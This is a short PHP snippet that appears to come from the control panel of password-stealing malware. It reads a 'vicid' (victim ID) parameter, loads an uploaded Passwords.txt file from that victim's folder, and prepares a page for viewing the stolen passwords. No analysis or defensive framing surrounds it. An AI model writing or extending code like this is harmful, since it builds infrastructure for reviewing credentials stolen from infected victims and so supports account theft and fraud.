<?php

$vicID = isset($_GET['vicid']) ? $utils->sanitize($_GET['vicid']) : '';

if (file_exists("upload/$vicID/Passwords.txt")) {
    $lines = $utils->parseFile("upload/$vicID/Passwords.txt", "\n", true);
} else {
    die("Passwords file does not exist");
}

$page = "viewPasswordsPage";
